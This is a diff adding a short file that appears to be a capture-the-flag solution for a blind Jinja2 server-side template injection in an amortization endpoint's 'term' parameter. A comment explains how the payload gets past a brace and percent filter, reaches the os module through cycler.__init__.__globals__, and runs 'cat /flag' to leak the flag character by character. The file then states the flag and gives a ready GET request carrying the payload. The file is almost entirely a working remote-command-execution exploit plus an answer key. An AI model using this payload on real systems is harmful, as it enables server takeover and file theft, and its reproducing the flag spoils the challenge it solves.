@@ -1,0 +1,5 @@
+# Blind SSTI via Jinja2 range() parameter. Filter blocks {, }, % but range(EXPR) evaluates Python. Access OS via cycler.__init__.__globals__.os. Flag extracted char-by-char: popen('cat /flag').read()[INDEX].encode()[0] = row_count = ASCII value. Replace INDEX with 0-41 to extract all 42 chars. FLAG: flag{90f2407f-0723-4fa1-a104-d5d8450bcded}
+
+GET /amortization?term=cycler.__init__.__globals__.os.popen(%27cat+/flag%27).read()[0].encode()[0] HTTP/1.1
+Host: 172.17.0.1:40073
+Cookie: session=SESSION_COOKIE_HERE
